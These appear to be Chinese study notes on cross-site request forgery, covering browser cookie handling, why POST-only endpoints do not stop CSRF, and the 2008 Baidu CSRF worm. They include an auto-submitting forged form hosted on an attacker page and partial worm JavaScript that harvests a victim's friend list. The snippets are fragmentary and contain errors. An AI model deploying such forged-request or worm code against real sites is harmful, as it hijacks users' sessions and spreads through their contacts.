#CSRF

Cross Site Request Forgery


##Classic CSRF attack

![Classic CSRF attack](img/csrf_attack.png)

##浏览器的Cookie策略

攻击者通过实施CSRF攻击之所以能够成功，是因为攻击者通过用户的浏览器成功发送了Cookie的缘故。
浏览器所持有的Cookie分为两种：临时Cookie（Session Cookie）和本地Cookie（Third-party Cookie）。
Third-party Cookie可以保持登录信息到用户下次与服务器的会话。下次访问同一网站时，用户会发现不必输入用户名和密码就已经登录了。而Session Cookie在用户退出会话的时
候就被删除了。
Third-party Cookie在生成时就会被指定一个Expire值，这就是Cookie的生存周期，在这
个周期内Cookie有效，超出周期Cookie就会被清除。
在浏览网站的过程中，若是一个网站设置了Session Cookie，那么在浏览器进程的生命周期内，即使浏览器新打开了Tab页，Session Cookie也都是有效的，这样攻击者伪装来自受信任用户的请求来访问受信任的网站就如正常一般了。


##POST请求无法防范CSRF


一些人认为CSRF攻击只能由GET请求发起，只要把重要的操作改成只允许POST请求，就能防止CSRF攻击。但是对于很多网站的应用来说，一些重要操作并未严格区分GET与
POST，攻击者可以使用GET来请求表单的提交地址。
如：
    <form action=”/login” id=”login” method=”post”>    
	
	<input type=text name=”username” value=””/>    
	
	<input type=password name=”password” value=””/>    
	
	<input type=submit name=”submit” value=”submit”/>    
	
	</form>    
	
     
用户可以尝试构造一个GET请求：

` http://localhost/login?username=a&password=a `

如果服务器端已经区分了GET和POST，这样攻击者可以构造一个POST请求。
最简单的方法是在一个页面中构造一个form表单，然后使用JavaScript自动提交这个表单。
攻击者在www.attack.com/attack.html 中编写如下代码：


    <form action=”http://www.target,com/login” id=”login” method=”post”>   

    <input type=text name=”username” value=””/>      
	 
    <input type=password name=”password” value=””/>     
	 
    <input type=submit name=”submit” value=”submit”/>     
	 
    </form>     
	 
    <script>     
	 
    var a = document.getElementById(“login”);     
	 
    a.inputs[0].value = “a”;     
	 
    a.inputs[1].value = “a”;      
	 
    f.submit();     
	 
    </script>

##CSRF Worm

2008年9月，国内的安全组织80sec公布了一个百度的CSRF worm

漏洞出现在百度用户中心的发送短消息功能中：

http://msg.baidu.com/?ct=22&cm=MailSend&tn=bmSubmit&sn=用户账户&co=消息内容

只需要修改参数sn，即可对指定的用户发送短消息。而百度的另外一个接口则能查询出某个用户的所有好友：

http://frd.baidu.com/?ct=28&un=用户账户&cm=FriList&tn=bmABCFriList&callback=gotfriends

将两者结合起来，可以组合成一个CSRFworm——让一个百度用户查看恶意页面后，将给他的好友发送一条短消息，然后这条短消息中又包含一张图片，其地址再次指向CSRF页面，使得这些好友再次执行上一个操作。

Step 1：

     var lsURL=window.location.href;
     loU = lsURL.split(“?”);
     if(loU.length>1)
     {
      var loallPm = loU[1].split(“&”);
     ....

定义蠕虫页面服务器地址，取得？和&符号后的字符串，从URL中提取感染蠕虫的用户名和感染者好友的用户名。

Step 2:

     var gotfriends = function (x)
     {
      for(i=0;i<x[2].length;i++)
        {
          friends.push(x[2][i][1]);
        }
     }
     loadtom(‘<script scr=”http://frd.baidu.com/?ct=28&un=”+lusername+”&cm=FriList&tn=bmABCFriList&callback=gotfriends&.tmp=&1=2”></script>’);
     
通过CSRF漏洞从远程加载受害者的好友tom数据，根据该接口的tom数据格式，提取好友数据为蠕虫的传播流程做准备。

Step 3：感染信息输出和消息发送的核心部分。

这个蠕虫很好地展示了CSRF的破坏性--即使没有XSS漏洞，仅仅依靠CSRF，也能够发起大规模蠕虫攻击。
